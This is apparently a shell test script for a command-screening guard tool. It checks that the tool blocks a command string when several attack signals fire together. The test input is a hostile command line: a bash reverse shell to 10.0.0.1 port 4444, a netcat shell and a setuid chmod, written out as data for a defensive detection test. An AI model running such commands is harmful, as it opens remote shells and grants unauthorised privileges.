#!/usr/bin/env bash
# V2-J-2: opt-in auto-Block escalation when `[accumulator]
# block_threshold` is set AND combined confidence ≥ threshold AND ≥ 2
# distinct signals fired. Same multi-atom shape as v2j_accumulator;
# the differentiator is the TOML knob upgrading Warn → Block.

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

CONFIG_FILE=$(mktemp -t atty-guard-autoblock.XXXXXX.toml)
# Preserve the module-level `trap stop_guard EXIT INT TERM` set by
# common.sh — a bare `trap '...' EXIT` would silently replace it and
# leak the daemon.
trap 'rm -f "$CONFIG_FILE"; stop_guard' EXIT INT TERM

cat > "$CONFIG_FILE" <<TOML
[accumulator]
block_threshold = 0.9
TOML

start_guard --tier2 stub --config "$CONFIG_FILE"

# Multi-atom shape with combined > 0.9 → escalates to Block.
classify "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x"
expect_verdict block
expect_confidence_ge 0.9
expect_reason_contains "signals fired"

pass "V2-J-2 auto-Block: multi-hit + threshold met → Block verdict"
